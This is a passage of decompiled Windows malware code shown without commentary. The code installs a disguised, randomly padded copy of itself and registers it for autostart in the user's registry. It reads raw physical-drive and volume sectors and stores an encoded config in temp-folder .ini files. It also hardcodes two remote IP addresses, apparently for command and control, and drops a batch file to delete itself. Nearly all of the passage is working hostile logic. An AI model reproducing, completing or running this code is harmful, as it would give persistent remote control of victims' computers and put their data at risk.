      _wcscpy_s(awStack_1acc,0x10,&wStack_80c);
    }
    uStack_1a68 = 0x100025b;
    if (iStack_1a6c == 0) {
      iStack_1a6c = 5;
    }
    iVar16 = FUN_00402660(&local_1c34);
    if (iVar16 != 0) {
      pwVar13 = &local_143c;
      FUN_00401e90();
      FUN_004027f0(pwVar13);
      pHStack_1c44 = (HKEY)0x0;
      LVar12 = RegOpenKeyExW((HKEY)0x80000001,
                             L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows",0,3,
                             &pHStack_1c44);
      if (LVar12 == 0) {
        do {
          wVar3 = *pwVar13;
          pwVar13 = pwVar13 + 1;
        } while (wVar3 != L'\0');
        LVar12 = RegSetValueExW(pHStack_1c44,L"Run",0,1,(BYTE *)&local_143c,
                                ((int)pwVar13 - (int)local_143a >> 1) * 2 + 2);
        if (LVar12 == 0) {
          RegCloseKey(pHStack_1c44);
        }
      }
      ShellExecuteW((HWND)0x0,(LPCWSTR)0x0,&local_143c,L"",(LPCWSTR)0x0,1);
    }
  }
LAB_00401bb3:
  ___security_check_cookie_4(local_8 ^ (uint)auStack_1c4c);
  return;
}



void __cdecl FUN_00401bd0(int param_1)

{
  int iVar1;
  uint uVar2;
  void *unaff_EDI;
  undefined auStack_20c [4];
  int local_208 [129];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)auStack_20c;
  if (unaff_EDI != (void *)0x0) {
    _memset(local_208,0,0x200);
    if (param_1 == 0) {
      iVar1 = FUN_00401d70();
    }
    else {
      iVar1 = FUN_00401c80();
    }
    if (iVar1 != 0) {
      uVar2 = 0;
      do {
        *(byte *)((int)local_208 + uVar2) = ~*(byte *)((int)local_208 + uVar2);
        uVar2 = uVar2 + 1;
      } while (uVar2 < 0x200);
      if (local_208[0] == 0x504d534d) {
        _memmove(unaff_EDI,local_208,0x200);
        ___security_check_cookie_4(local_4 ^ (uint)auStack_20c);
        return;
      }
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_20c);
  return;
}



void FUN_00401c80(void)

{
  wchar_t *pwVar1;
  wchar_t *pwVar2;
  void *unaff_ESI;
  FILE *local_214 [2];
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)local_214;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  local_214[0] = (FILE *)0x0;
  if (unaff_ESI != (void *)0x0) {
    pwVar1 = L"golfinfo.ini";
    do {
      pwVar2 = pwVar1;
      pwVar1 = pwVar2 + 1;
    } while (*pwVar2 != L'\0');
    if ((int)(pwVar2 + -0x216432) >> 1 != 0) {
      GetTempPathW(0x104,&local_20c);
      _wcscat_s(&local_20c,0x104,L"golfinfo.ini");
      __wfopen_s(local_214,&local_20c,L"rb");
      if (local_214[0] != (FILE *)0x0) {
        _fread(unaff_ESI,0x200,1,local_214[0]);
        _fclose(local_214[0]);
        ___security_check_cookie_4(local_4 ^ (uint)local_214);
        return;
      }
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)local_214);
  return;
}



void FUN_00401d70(void)

{
  wchar_t *pwVar1;
  wchar_t *pwVar2;
  void *unaff_ESI;
  FILE *local_214 [2];
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)local_214;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  local_214[0] = (FILE *)0x0;
  if (unaff_ESI != (void *)0x0) {
    pwVar1 = L"golfset.ini";
    do {
      pwVar2 = pwVar1;
      pwVar1 = pwVar2 + 1;
    } while (*pwVar2 != L'\0');
    if ((int)(pwVar2 + -0x2163d8) >> 1 != 0) {
      if (DAT_00433fbc == 3) {
        GetSystemDirectoryW(&local_20c,0x104);
        _wcscat_s(&local_20c,0x104,(wchar_t *)&DAT_0042c888);
      }
      else {
        GetTempPathW(0x104,&local_20c);
      }
      _wcscat_s(&local_20c,0x104,L"golfset.ini");
      __wfopen_s(local_214,&local_20c,L"rb");
      if (local_214[0] != (FILE *)0x0) {
        _fread(unaff_ESI,0x200,1,local_214[0]);
        _fclose(local_214[0]);
        ___security_check_cookie_4(local_4 ^ (uint)local_214);
        return;
      }
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)local_214);
  return;
}



void FUN_00401e90(void)

{
  LPWSTR unaff_EDI;
  wchar_t local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_20c;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  if (DAT_00433fbc == 3) {
    GetSystemDirectoryW(&local_20c,0x104);
    _wcscat_s(&local_20c,0x104,(wchar_t *)&DAT_0042c888);
  }
  else {
    GetTempPathW(0x104,&local_20c);
  }
  wsprintfW(unaff_EDI,L"%s%s.exe",&local_20c);
  ___security_check_cookie_4(local_4 ^ (uint)&local_20c);
  return;
}



void FUN_00401f30(void)

{
  wchar_t *unaff_ESI;
  wchar_t local_234;
  undefined4 local_232;
  undefined4 local_22e;
  undefined4 local_22a;
  undefined4 local_226;
  undefined4 local_222;
  undefined4 local_21e;
  undefined4 local_21a;
  undefined4 local_216;
  undefined4 local_212;
  undefined2 local_20e;
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_234;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  local_232 = 0;
  local_22e = 0;
  local_22a = 0;
  local_226 = 0;
  local_222 = 0;
  local_21e = 0;
  local_21a = 0;
  local_216 = 0;
  local_212 = 0;
  local_20e = 0;
  local_234 = L'\0';
  _wcscpy_s(&local_234,0x14,unaff_ESI);
  _wcscat_s(&local_234,0x14,L".exe");
  GetModuleFileNameW((HMODULE)0x0,&local_20c,0x104);
  _wcsstr(&local_20c,&local_234);
  ___security_check_cookie_4(local_4 ^ (uint)&local_234);
  return;
}



undefined4 __cdecl FUN_00402000(undefined4 *param_1)

{
  short sVar1;
  HANDLE in_EAX;
  undefined4 *_Dst;
  uint uVar2;
  int iVar3;
  short *psVar4;
  undefined4 uVar5;
  undefined4 *puVar6;
  
  uVar5 = 0;
  if (in_EAX == (HANDLE)0xffffffff) {
    return 0;
  }
  _Dst = (undefined4 *)FUN_0040a3f1(0x400);
  _memset(_Dst,0,0x400);
  uVar2 = FUN_00402200(in_EAX);
  iVar3 = FUN_00402340(uVar2,_Dst);
  if (iVar3 == 0) goto LAB_004020b5;
  if (_Dst[1] == 0x5042475f) {
    psVar4 = (short *)((int)_Dst + 0x10e);
    do {
      sVar1 = *psVar4;
      psVar4 = psVar4 + 1;
    } while (sVar1 != 0);
    if ((int)psVar4 - (int)(_Dst + 0x44) >> 1 == 0) goto LAB_00402071;
  }
  else {
LAB_00402071:
    iVar3 = FUN_00402340(0x1e,_Dst);
    if ((iVar3 == 0) || (_Dst[1] != 0x5042475f)) goto LAB_004020b5;
    psVar4 = (short *)((int)_Dst + 0x10e);
    do {
      sVar1 = *psVar4;
      psVar4 = psVar4 + 1;
    } while (sVar1 != 0);
    if ((int)psVar4 - (int)(_Dst + 0x44) >> 1 == 0) goto LAB_004020b5;
  }
  puVar6 = _Dst;
  for (iVar3 = 0x8d; iVar3 != 0; iVar3 = iVar3 + -1) {
    *param_1 = *puVar6;
    puVar6 = puVar6 + 1;
    param_1 = param_1 + 1;
  }
  *(undefined2 *)param_1 = *(undefined2 *)puVar6;
  uVar5 = 1;
LAB_004020b5:
  if (_Dst != (undefined4 *)0x0) {
    FUN_0040a3fc(_Dst);
  }
  return uVar5;
}



void __cdecl FUN_004020d0(undefined4 *param_1)

{
  HANDLE pvVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  int local_254;
  undefined4 *local_250;
  wchar_t wStack_24c;
  undefined4 uStack_24a;
  undefined4 uStack_246;
  undefined4 uStack_242;
  undefined4 uStack_23e;
  undefined2 uStack_23a;
  undefined4 auStack_238 [9];
  undefined4 uStack_214;
  WCHAR local_210;
  undefined local_20e [522];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_254;
  local_250 = param_1;
  local_210 = L'\0';
  _memset(local_20e,0,0x206);
  local_254 = 0;
  GetSystemDirectoryW(&local_210,0x104);
  FUN_004023a0(local_210 + L'');
  uStack_24a = 0;
  uStack_246 = 0;
  uStack_242 = 0;
  uStack_23e = 0;
  uStack_23a = 0;
  puVar3 = (undefined4 *)L"\\\\.\\PHYSICALDRIVE";
  puVar4 = auStack_238;
  for (iVar2 = 9; iVar2 != 0; iVar2 = iVar2 + -1) {
    *puVar4 = *puVar3;
    puVar3 = puVar3 + 1;
    puVar4 = puVar4 + 1;
  }
  uStack_214 = 0;
  wStack_24c = L'\0';
  if (-1 < local_254) {
    __itow_s(local_254,&wStack_24c,10,10);
    _wcscat_s((wchar_t *)auStack_238,0x14,&wStack_24c);
    pvVar1 = CreateFileW((LPCWSTR)auStack_238,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,
                         (HANDLE)0x0);
    if (pvVar1 != (HANDLE)0xffffffff) {
      FUN_00402000(local_250);
      ___security_check_cookie_4(local_4 ^ (uint)&local_254);
      return;
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_254);
  return;
}



undefined4 __cdecl FUN_00402200(HANDLE param_1)

{
  int iVar1;
  uint uVar2;
  void *lpOutBuffer;
  BOOL BVar3;
  uint uVar4;
  uint uVar5;
  int iVar6;
  int iVar7;
  undefined8 uVar8;
  undefined4 uStack_10;
  DWORD DStack_c;
  uint uStack_8;
  
  Sleep(100);
  iVar6 = 0;
  iVar7 = 0;
  uVar5 = 0;
  uStack_10 = 0;
  uStack_8 = 0;
  if (param_1 != (HANDLE)0xffffffff) {
    lpOutBuffer = (void *)FUN_0040a3f1(0xb69);
    BVar3 = DeviceIoControl(param_1,0x70050,(LPVOID)0x0,0,lpOutBuffer,0xb69,&DStack_c,
                            (LPOVERLAPPED)0x0);
    if (BVar3 != 0) {
      iVar1 = *(int *)((int)lpOutBuffer + 0x34);
      uVar4 = uStack_8;
      if ((-1 < iVar1) && ((0 < iVar1 || (*(uint *)((int)lpOutBuffer + 0x30) != 0)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x38);
        iVar6 = *(int *)((int)lpOutBuffer + 0x3c);
        uVar4 = *(uint *)((int)lpOutBuffer + 0x30);
        iVar7 = iVar1;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0xbd);
      uVar2 = *(uint *)((int)lpOutBuffer + 0xb9);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0xc1);
        iVar6 = *(int *)((int)lpOutBuffer + 0xc5);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0x146);
      uVar2 = *(uint *)((int)lpOutBuffer + 0x142);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x14a);
        iVar6 = *(int *)((int)lpOutBuffer + 0x14e);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      iVar1 = *(int *)((int)lpOutBuffer + 0x1cf);
      uVar2 = *(uint *)((int)lpOutBuffer + 0x1cb);
      if ((iVar7 <= iVar1) && ((iVar7 < iVar1 || (uVar4 < uVar2)))) {
        uVar5 = *(uint *)((int)lpOutBuffer + 0x1d3);
        iVar6 = *(int *)((int)lpOutBuffer + 0x1d7);
        uVar4 = uVar2;
        iVar7 = iVar1;
        uStack_8 = uVar2;
      }
      uVar8 = __alldiv(uVar5 + uVar4,iVar6 + iVar7 + (uint)CARRY4(uVar5,uVar4),0x200,0);
      uStack_10 = (undefined4)uVar8;
    }
    if (lpOutBuffer != (void *)0x0) {
      FUN_0040a3fc(lpOutBuffer);
    }
  }
  Sleep(100);
  return uStack_10;
}



void __cdecl FUN_00402340(uint param_1,LPVOID param_2)

{
  HANDLE unaff_ESI;
  DWORD local_18;
  _OVERLAPPED local_14;
  
  local_14.Internal = 0;
  local_14.InternalHigh = 0;
  local_14.hEvent = (HANDLE)0x0;
  local_18 = 0;
  if (unaff_ESI != (HANDLE)0xffffffff) {
    local_14.u = (_union_518)((ulonglong)param_1 * 0x200);
    ReadFile(unaff_ESI,param_2,0x400,&local_18,&local_14);
  }
  return;
}



void __cdecl FUN_004023a0(short param_1)

{
  HANDLE hDevice;
  BOOL BVar1;
  undefined4 *unaff_EBX;
  DWORD DStack_438;
  undefined4 local_434;
  undefined2 local_430;
  wchar_t local_42c;
  undefined4 local_42a;
  undefined4 local_426;
  undefined4 local_422;
  undefined4 local_41e;
  undefined4 local_41a;
  undefined4 local_416;
  undefined4 local_412;
  undefined4 local_40e;
  undefined4 local_40a;
  undefined2 local_406;
  undefined auStack_404 [4];
  undefined4 uStack_400;
  uint uStack_3fc;
  uint uStack_3f8;
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&DStack_438;
  local_430 = 0;
  local_42a = 0;
  local_426 = 0;
  local_422 = 0;
  local_41e = 0;
  local_41a = 0;
  local_416 = 0;
  local_412 = 0;
  local_40e = 0;
  local_40a = 0;
  local_406 = 0;
  local_434 = CONCAT22(0x3a,param_1 + 0x41);
  local_42c = L'\0';
  FUN_00404c10(&local_434,&local_42c,L"\\\\.\\%s");
  hDevice = CreateFileW(&local_42c,0x80000000,3,(LPSECURITY_ATTRIBUTES)0x0,3,0,(HANDLE)0x0);
  if (hDevice != (HANDLE)0xffffffff) {
    BVar1 = DeviceIoControl(hDevice,0x560000,(LPVOID)0x0,0,auStack_404,0x400,&DStack_438,
                            (LPOVERLAPPED)0x0);
    if (BVar1 != 0) {
      __alldiv(uStack_3fc,uStack_3f8,0x200,0);
      *unaff_EBX = uStack_400;
    }
  }
  if (hDevice != (HANDLE)0x0) {
    CloseHandle(hDevice);
  }
  ___security_check_cookie_4(local_4 ^ (uint)&DStack_438);
  return;
}



void __fastcall FUN_004024b0(uint param_1)

{
  wchar_t *unaff_ESI;
  wchar_t local_24;
  undefined4 local_22;
  undefined4 local_1e;
  undefined4 local_1a;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 local_e;
  undefined4 local_a;
  undefined2 local_6;
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_24;
  local_24 = L'\0';
  local_22 = 0;
  local_1e = 0;
  local_1a = 0;
  local_16 = 0;
  local_12 = 0;
  local_e = 0;
  local_a = 0;
  local_6 = 0;
  FUN_00404c30(param_1 >> 0x18,&local_24,L"%d.%d.%d.%d");
  _wcscpy_s(unaff_ESI,0x10,&local_24);
  ___security_check_cookie_4(local_4 ^ (uint)&local_24);
  return;
}



void __cdecl FUN_00402530(int param_1)

{
  int iVar1;
  undefined4 extraout_ECX;
  undefined4 extraout_ECX_00;
  int iVar2;
  undefined4 extraout_EDX;
  undefined4 extraout_EDX_00;
  uint uVar3;
  int iVar4;
  int iVar5;
  ulonglong uVar6;
  ulonglong uVar7;
  int local_68 [4];
  undefined4 local_58;
  undefined4 local_54;
  undefined4 local_50;
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined4 local_3c;
  undefined4 local_38;
  undefined4 local_34;
  undefined4 local_30;
  undefined4 local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 local_20;
  undefined4 local_1c;
  undefined4 local_18;
  undefined4 local_14;
  undefined4 local_10;
  undefined4 local_c;
  undefined4 local_8;
  undefined4 local_4;
  
  local_68[1] = 0xffffffff;
  local_68[2] = 0xffffffff;
  local_68[3] = 0xffffffff;
  local_54 = 0xffffffff;
  local_50 = 0xffffffff;
  local_4c = 0xffffffff;
  local_44 = 0xffffffff;
  local_40 = 0xffffffff;
  local_3c = 0xffffffff;
  local_38 = 0xffffffff;
  local_34 = 0xffffffff;
  local_2c = 0xffffffff;
  local_28 = 0xffffffff;
  local_24 = 0xffffffff;
  local_20 = 0xffffffff;
  local_1c = 0xffffffff;
  local_14 = 0xffffffff;
  local_10 = 0xffffffff;
  local_c = 0xffffffff;
  local_4 = 0xffffffff;
  local_8 = 1;
  local_18 = 1;
  local_30 = 1;
  local_48 = 1;
  local_58 = 1;
  local_68[0] = 1;
  _rand();
  uVar6 = FUN_00418930(extraout_ECX,extraout_EDX);
  iVar4 = 0;
  iVar5 = 0;
  if (0 < (int)uVar6) {
    do {
      _rand();
      uVar7 = FUN_00418930(extraout_ECX_00,extraout_EDX_00);
      iVar2 = (int)uVar7;
      uVar3 = local_68[iVar2] + iVar4 >> 0x1f;
      iVar1 = (local_68[iVar2] + iVar4 ^ uVar3) - uVar3;
      while (1 < iVar1) {
        iVar2 = iVar2 + 1;
        if (iVar2 == 0x1a) {
          iVar2 = 0;
        }
        uVar3 = local_68[iVar2] + iVar4 >> 0x1f;
        iVar1 = (local_68[iVar2] + iVar4 ^ uVar3) - uVar3;
      }
      iVar4 = iVar4 + local_68[iVar2];
      *(short *)(param_1 + iVar5 * 2) = (short)iVar2 + 0x61;
      iVar5 = iVar5 + 1;
    } while (iVar5 < (int)uVar6);
  }
  return;
}



void __cdecl FUN_00402660(int *param_1)

{
  uint uVar1;
  undefined auStack_20c [4];
  byte local_208 [516];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)auStack_20c;
  if ((param_1 != (int *)0x0) && (*param_1 == 0x504d534d)) {
    _memmove(local_208,param_1,0x200);
    uVar1 = 0;
    do {
      local_208[uVar1] = ~local_208[uVar1];
      uVar1 = uVar1 + 1;
    } while (uVar1 < 0x200);
    FUN_004026f0();
    ___security_check_cookie_4(local_4 ^ (uint)auStack_20c);
    return;
  }
  ___security_check_cookie_4(local_4 ^ (uint)auStack_20c);
  return;
}



void FUN_004026f0(void)

{
  short *psVar1;
  short *psVar2;
  void *unaff_EDI;
  FILE *local_214 [2];
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)local_214;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  if (unaff_EDI != (void *)0x0) {
    local_214[0] = (FILE *)0x0;
    psVar1 = &DAT_0042c760;
    do {
      psVar2 = psVar1;
      psVar1 = psVar2 + 1;
    } while (*psVar2 != 0);
    if ((int)(psVar2 + -0x2163b0) >> 1 == 0) {
      GetTempPathW(0x104,&local_20c);
      _wcscat_s(&local_20c,0x104,L"golfinfo.ini");
      __wfopen_s(local_214,&local_20c,L"wb");
    }
    else {
      __wfopen_s(local_214,L"",L"wb");
    }
    if (local_214[0] != (FILE *)0x0) {
      _fwrite(unaff_EDI,0x200,1,local_214[0]);
      _fclose(local_214[0]);
    }
    ___security_check_cookie_4(local_4 ^ (uint)local_214);
    return;
  }
  ___security_check_cookie_4(local_4 ^ (uint)local_214);
  return;
}



undefined4 __cdecl FUN_004027f0(wchar_t *param_1)

{
  wchar_t *in_EAX;
  errno_t eVar1;
  size_t _ElementSize;
  void *_DstBuf;
  FILE *local_4;
  
  local_4 = (FILE *)0x0;
  eVar1 = __wfopen_s(&local_4,in_EAX,L"rb");
  if (eVar1 != 0) {
    return 0;
  }
  _fseek(local_4,0,2);
  _ElementSize = _ftell(local_4);
  _fseek(local_4,0,0);
  _DstBuf = _malloc(_ElementSize + 0x32);
  _fread(_DstBuf,_ElementSize,1,local_4);
  _fclose(local_4);
  FUN_004028c0();
  eVar1 = __wfopen_s(&local_4,param_1,L"wb");
  if (eVar1 != 0) {
    return 0;
  }
  _fwrite(_DstBuf,_ElementSize + 0x32,1,local_4);
  _fclose(local_4);
  return 1;
}



void FUN_004028c0(void)

{
  size_t in_EAX;
  DWORD DVar1;
  int iVar2;
  void *unaff_EBX;
  int iVar3;
  int iVar4;
  
  _memset(unaff_EBX,0,in_EAX);
  iVar4 = (int)(in_EAX + ((int)in_EAX >> 0x1f & 3U)) >> 2;
  DVar1 = GetTickCount();
  FUN_00414927(DVar1);
  iVar3 = 0;
  if (0 < iVar4) {
    do {
      iVar2 = _rand();
      *(int *)((int)unaff_EBX + iVar3 * 4) = iVar2;
      iVar3 = iVar3 + 1;
    } while (iVar3 < iVar4);
  }
  return;
}



void FUN_00402910(void)

{
  char cVar1;
  char *pcVar2;
  HANDLE hFile;
  char *pcVar3;
  char *pcVar4;
  DWORD local_314;
  CHAR local_310 [260];
  CHAR aCStack_20c [260];
  char acStack_108 [260];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_314;
  local_314 = 0;
  GetTempPathA(0x104,local_310);
  _strcat_s(local_310,0x104,"_uinsey.bat");
  GetModuleFileNameA((HMODULE)0x0,aCStack_20c,0x104);
  _strcpy_s(acStack_108,0x104,aCStack_20c);
  pcVar2 = _strrchr(acStack_108,0x5c);
  if (pcVar2 != (char *)0x0) {
    *pcVar2 = '\0';
  }
  hFile = CreateFileA(local_310,0x40000000,0,(LPSECURITY_ATTRIBUTES)0x0,2,0x80,(HANDLE)0x0);
  if (hFile != (HANDLE)0xffffffff) {
    pcVar2 = s__Repeat_del___s__if_exist___s__g_00434048;
    do {
      pcVar4 = pcVar2;
      pcVar2 = pcVar4 + 1;
    } while (*pcVar4 != '\0');
    pcVar2 = aCStack_20c;
    do {
      cVar1 = *pcVar2;
      pcVar2 = pcVar2 + 1;
    } while (cVar1 != '\0');
    pcVar3 = local_310;
    do {
      cVar1 = *pcVar3;
      pcVar3 = pcVar3 + 1;
    } while (cVar1 != '\0');
    pcVar2 = pcVar3 + (int)pcVar2 * 3 + (int)&stack0xfffffce8 * -4 + (int)(pcVar4 + -0x434346);
    pcVar4 = (char *)FUN_0040a3f1((uint)pcVar2);
    _memset(pcVar4,0,(size_t)pcVar2);
    _sprintf_s(pcVar4,(size_t)pcVar2,s__Repeat_del___s__if_exist___s__g_00434048,aCStack_20c,
               aCStack_20c,acStack_108,local_310);
    pcVar2 = pcVar4;
    do {
      cVar1 = *pcVar2;
      pcVar2 = pcVar2 + 1;
    } while (cVar1 != '\0');
    WriteFile(hFile,pcVar4,(int)pcVar2 - (int)(pcVar4 + 1),&local_314,(LPOVERLAPPED)0x0);
    CloseHandle(hFile);
    ShellExecuteA((HWND)0x0,"open",local_310,(LPCSTR)0x0,(LPCSTR)0x0,0);
    if (pcVar4 != (char *)0x0) {
      FUN_0040a3fc(pcVar4);
    }
  }
  ___security_check_cookie_4(local_4 ^ (uint)&local_314);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00402ab0(void)

{
  short sVar1;
  undefined4 *puVar2;
  int iVar3;
  undefined4 *puVar4;
  HANDLE pvVar5;
  undefined auStack_3e8 [400];
  short sStack_258;
  undefined auStack_256 [58];
  short asStack_21c [4];
  undefined2 local_214;
  undefined local_212 [514];
  uint uStack_10;
  uint local_8;
  
  local_8 = DAT_00432c20 ^ (uint)auStack_3e8;
  local_214 = 0;
  _memset(local_212,0,0x206);
  Ordinal_115(0x101);
  iVar3 = FUN_00401bd0(1);
  if (iVar3 == 0) {
    sStack_258 = 0;
    _memset(auStack_256,0,0x3a);
    FUN_00402cc0();
    iVar3 = 0;
    do {
      sVar1 = *(short *)(auStack_256 + iVar3 + -2);
      *(short *)((int)&DAT_00437628 + iVar3) = sVar1;
      iVar3 = iVar3 + 2;
    } while (sVar1 != 0);
    _wcscpy_s((wchar_t *)&DAT_00437484,0x40,L"218.54.31.165");
    DAT_00437504 = 0x51;
    _wcscpy_s(&DAT_00437506,0x10,L"AAAA");
    _wcscpy_s((wchar_t *)&DAT_00437526,0x40,L"218.54.31.226");
    DAT_004375a6 = 0x2b66;
    iVar3 = 0;
    do {
      sVar1 = *(short *)(auStack_256 + iVar3 + -2);
      *(short *)((int)&DAT_00437608 + iVar3) = sVar1;
      iVar3 = iVar3 + 2;
    } while (sVar1 != 0);
    puVar2 = (undefined4 *)0x437606;
    do {
      puVar4 = puVar2;
      puVar2 = (undefined4 *)((int)puVar4 + 2);
    } while (*(short *)((int)puVar4 + 2) != 0);
    *(undefined4 *)((int)puVar4 + 2) = 0x760073;
    *(undefined2 *)((int)puVar4 + 6) = 0;
    DAT_00437648 = 5;
  }
  FUN_00402d60();
  FUN_00402cc0();
  iVar3 = 0;
  do {
    sVar1 = *(short *)((int)asStack_21c + iVar3);
    *(short *)((int)&DAT_004378b8 + iVar3) = sVar1;
    iVar3 = iVar3 + 2;
  } while (sVar1 != 0);
  pvVar5 = OpenEventW(0x20000,0,&DAT_004378b8);
  if (pvVar5 == (HANDLE)0x0) {
    pvVar5 = CreateEventW((LPSECURITY_ATTRIBUTES)0x0,0,0,&DAT_004378b8);
    if (pvVar5 != (HANDLE)0x0) {
      FUN_00402fb0(&DAT_00437938);
      _DAT_00437940 = DAT_0043764c;
      _DAT_00434038 =
           CreateThread((LPSECURITY_ATTRIBUTES)0x0,0,(LPTHREAD_START_ROUTINE)&LAB_00403590,
                        (LPVOID)0x0,0,(LPDWORD)0x0);
      ___security_check_cookie_4(uStack_10 ^ (uint)&stack0xfffffc10);
      return;
    }
  }
  else {
    CloseHandle(pvVar5);
  }
  ___security_check_cookie_4(uStack_10 ^ (uint)&stack0xfffffc10);
  return;
}



void FUN_00402cc0(void)

{
  wchar_t wVar1;
  wchar_t *pwVar2;
  wchar_t *pwVar3;
  int iVar4;
  int unaff_EDI;
  WCHAR local_20c;
  undefined local_20a [518];
  uint local_4;
  
  local_4 = DAT_00432c20 ^ (uint)&local_20c;
  local_20c = L'\0';
  _memset(local_20a,0,0x206);
  GetModuleFileNameW((HMODULE)0x0,&local_20c,0x104);
  pwVar2 = _wcsrchr(&local_20c,L'\\');
  *pwVar2 = L'\0';
  pwVar2 = pwVar2 + 1;
  pwVar3 = _wcsrchr(pwVar2,L'.');
  *pwVar3 = L'\0';
  iVar4 = unaff_EDI - (int)pwVar2;
  do {
    wVar1 = *pwVar2;
    *(wchar_t *)(iVar4 + (int)pwVar2) = wVar1;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  ___security_check_cookie_4(local_4 ^ (uint)&local_20c);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00402d60(void)

{
  short *psVar1;
  int iVar2;
  
  _DAT_00437688 = DAT_00437648;
  DAT_00437780 = FUN_00402e10(&DAT_00437526);
  DAT_00437784 = DAT_004375a6;
  DAT_00437786 = FUN_00402e10(&DAT_00437484);
  DAT_0043778a = (uint)DAT_00437504;
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00437506 + iVar2);
    *(short *)((int)&DAT_0043778e + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00437628 + iVar2);
    *(short *)((int)&DAT_004377ae + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  iVar2 = 0;
  do {
    psVar1 = (short *)((int)&DAT_00437608 + iVar2);
    *(short *)((int)&DAT_004377ce + iVar2) = *psVar1;
    iVar2 = iVar2 + 2;
  } while (*psVar1 != 0);
  return;
}



uint FUN_00402e10(undefined4 param_1)

{
  undefined4 *puVar1;
  int iVar2;
  longlong lVar3;
  longlong lVar4;
  longlong lVar5;
  longlong lVar6;
  wchar_t *local_14;
  wchar_t *local_10 [4];
  
  local_10[0] = (wchar_t *)0x0;
  local_10[1] = (wchar_t *)0x0;
  local_10[2] = (wchar_t *)0x0;
  local_10[3] = (wchar_t *)0x0;
  iVar2 = 0;
  do {
    puVar1 = (undefined4 *)FUN_0040a3f1(0x20);
    *puVar1 = 0;
    puVar1[1] = 0;
    puVar1[2] = 0;
    puVar1[3] = 0;
    puVar1[4] = 0;
    local_10[iVar2] = (wchar_t *)puVar1;
    puVar1[5] = 0;
    iVar2 = iVar2 + 1;
    puVar1[6] = 0;
    puVar1[7] = 0;
  } while (iVar2 < 4);
  iVar2 = FUN_00402f10((int)local_10);
  if (iVar2 != 4) {
    return 0;
  }
  lVar3 = __wcstoi64(local_10[0],&local_14,10);
  lVar4 = __wcstoi64(local_10[1],&local_14,10);
  lVar5 = __wcstoi64(local_10[2],&local_14,10);
  lVar6 = __wcstoi64(local_10[3],&local_14,10);
  iVar2 = 0;
  do {
    if (local_10[iVar2] != (wchar_t *)0x0) {
      FUN_0040a3fc(local_10[iVar2]);
    }
    iVar2 = iVar2 + 1;
  } while (iVar2 < 4);
  return (uint)lVar6 | (((int)lVar3 << 8 | (uint)lVar4) << 8 | (uint)lVar5) << 8;
}



int __cdecl FUN_00402f10(int param_1)

{
  wchar_t wVar1;
  wchar_t *in_EAX;
  wchar_t *pwVar2;
  int iVar3;
  size_t _Count;
  
  iVar3 = 0;
  pwVar2 = in_EAX;
  do {
    wVar1 = *pwVar2;
    pwVar2 = pwVar2 + 1;
  } while (wVar1 != L'\0');
  if ((int)pwVar2 - (int)(in_EAX + 1) >> 1 == 0) {
    return 0;
  }
  pwVar2 = _wcsstr(in_EAX,L".");
  while (pwVar2 != (wchar_t *)0x0) {
    _Count = (int)pwVar2 - (int)in_EAX >> 1;
    if (0xf < (int)_Count) {
      _Count = 0xf;
    }
    _wcsncpy(*(wchar_t **)(param_1 + iVar3 * 4),in_EAX,_Count);
    in_EAX = pwVar2 + 1;
    *(undefined2 *)(*(int *)(param_1 + iVar3 * 4) + _Count * 2) = 0;
    iVar3 = iVar3 + 1;
    pwVar2 = _wcsstr(in_EAX,L".");
  }
  _wcscpy_s(*(wchar_t **)(param_1 + iVar3 * 4),0xf,in_EAX);
  return iVar3 + 1;
}



void __fastcall FUN_00402fb0(undefined4 *param_1)

{
  short sVar1;
  wchar_t wVar2;
  int iVar3;
  wchar_t *pwVar4;
  short *psVar5;
